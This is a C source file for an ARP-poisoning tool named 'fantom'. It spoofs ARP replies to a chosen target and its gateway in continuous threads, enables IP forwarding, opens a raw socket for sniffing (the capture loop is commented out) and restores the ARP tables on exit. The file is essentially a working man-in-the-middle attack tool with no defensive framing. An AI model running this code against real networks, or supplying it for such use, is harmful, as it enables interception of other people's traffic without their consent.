#include "network_structs.h"
#include "arp_utils.h"
#include <pthread.h>
#include <signal.h>

char* local_ip_str = (char*)"????";
char* target_ip_str = (char*)"????";
char* gateway_ip_str = (char*)"????";
char* network_interface = (char*)"????";

unsigned char target_mac[6];
unsigned char gateway_mac[6];

int sock;
int poisoning_socket;
int sniffer_socket;
LOCAL_DATA localData;

void show_usage()
{
    printf("\n***Usage: fantom [interface] [target ip] [gateway ip]\n\n");
}

int parse_arguments(int argc, char** argv, int socket)
{
    if (argc != 4)
    {
        show_usage();
        return 0;
    }

    network_interface = argv[1];
    target_ip_str     = argv[2];
    gateway_ip_str    = argv[3];

    getLocalProtocolAddress(socket, network_interface, &local_ip_str);
    return 1;
}

void cleanup(int sig)
{
    printf("\n[*] Re-Arping Targets . . . \n");
    uint32_t target_ip = charToUintIp(target_ip_str);
    uint32_t gateway_ip = charToUintIp(gateway_ip_str);

    // restoring target arp
    for (int i = 0; i < 16; i++)
    {
        send_arp_packet(poisoning_socket, localData.interface_index, gateway_mac, target_mac, gateway_ip, target_ip);
    }

    // restoring gateway arp
    for (int i = 0; i < 16; i++)
    {
        send_arp_packet(poisoning_socket, localData.interface_index, target_mac, gateway_mac, target_ip, gateway_ip);
    }

    close(sock);
    close(poisoning_socket);
    close(sniffer_socket);
    printf("[*] Stopping Service [*]\n\n");
    exit(0);
}

void* poison_target(void* param)
{
    uint32_t target_ip = charToUintIp(target_ip_str);
    uint32_t spoofed_gateway_ip = charToUintIp(gateway_ip_str);

    printf("[*] ARP poisoning target with IPv4: ");
    PrintIpAddress(target_ip);

    while (1)
    {
        sleep(1);
        send_arp_packet(poisoning_socket, localData.interface_index, localData.mac_address, target_mac, spoofed_gateway_ip, target_ip);
    }
    return 0;
}

void* poison_gateway(void* param)
{
    uint32_t gateway_ip = charToUintIp(gateway_ip_str);
    uint32_t spoofed_target_ip = charToUintIp(target_ip_str);

    printf("[*] ARP poisoning gateway with IPv4: ");
    PrintIpAddress(gateway_ip);
    printf("\n");

    while (1)
    {
        sleep(1);
        send_arp_packet(poisoning_socket, localData.interface_index, localData.mac_address, gateway_mac, spoofed_target_ip, gateway_ip);
    }
    return 0;
}

int main(int argc, char** argv)
{
    sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if (sock == -1) {
        printf("Error opening raw socket\n");
        return -1;
    }

    if (parse_arguments(argc, argv, sock) == 0)
    {
        return -1;
    }

    // enable ip forwarding
    system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward");
    printf("[+] Preparing ARP Socket [+]\n");

    signal(SIGINT, cleanup);

    struct ether_arp arpPacket;
    localData = get_local_data("wlan0", sock);
    struct in_addr ip_address_struct = { 0 };
    printf("\n======= Getting Local Data =======\n");
    printf("Interface       :  %s\n", localData.interface_name);
    printf("Interface Index :  %d\n", localData.interface_index);
    printf("MAC Address     :  "); PrintMacAddress(localData.mac_address);
    printf("IP address      :  %s\n", local_ip_str);
    printf("\n\n");

    // Getting target mac address
    get_mac_address(sock, localData, &arpPacket, charToUintIp(local_ip_str), charToUintIp(target_ip_str));
    memcpy(target_mac, arpPacket.arp_sha, sizeof(target_mac));
    printf("Target MAC   :  "); PrintMacAddress(target_mac);

    // Getting gateway mac address
    get_mac_address(sock, localData, &arpPacket, charToUintIp(local_ip_str), charToUintIp(gateway_ip_str));
    memcpy(gateway_mac, arpPacket.arp_sha, sizeof(gateway_mac));
    printf("Gateway MAC  :  "); PrintMacAddress(gateway_mac);
    printf("\n");

    close(sock);
    poisoning_socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));

    // Start arp poisoning target and gateway
    pthread_t target_thread, gateway_thread;
    pthread_create(&target_thread, NULL, poison_target, NULL);
    printf("\n");
    pthread_create(&gateway_thread, NULL, poison_gateway, NULL);

    // prepare the packet sniffer
    sniffer_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sniffer_socket < 0) {
        printf("Could not create raw ip socket for packet sniffing . . .\n");
        return -1;
    }

    uint8_t buffer[1540];
    while (1)
    {
        /*
        // recieve packets from the target
        int bytes = recv(sniffer_socket, buffer, sizeof(buffer), 0);
        if (bytes < 0)
        {
            printf("[-] Error occured when sniffing packets [-]\n");
            break;
        }
        if (bytes == 0) continue;

        printf("[*] Recieved bytes: %d [*]\n", bytes);
        */
    }
}
